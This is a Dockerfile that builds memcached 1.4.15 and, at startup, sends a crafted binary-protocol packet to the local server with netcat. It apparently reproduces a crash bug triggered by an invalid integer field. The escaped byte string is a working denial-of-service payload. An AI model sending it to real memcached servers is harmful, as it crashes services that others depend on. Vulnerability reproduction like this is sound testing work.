# segfault if invalid integer
# the behavior of container is ERROR and frozen instead of poping out segfault
FROM debian:latest
RUN apt-get update && apt-get install -y gcc libc6-dev make
RUN apt-get update && apt-get install -y wget
RUN apt-get update && apt-get install -y libevent-dev
RUN apt-get update && apt-get install -y perl
RUN apt-get update && apt-get install -y netcat
WORKDIR /tmp
ARG version=1.4.15
RUN wget https://www.memcached.org/files/memcached-$version.tar.gz
RUN tar -zxvf memcached-$version.tar.gz && rm memcached-$version.tar.gz
WORKDIR /tmp/memcached-$version
RUN ./configure && make && make test && make install
CMD sleep 1 && echo -en '\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' | nc localhost 11211 & memcached -u root
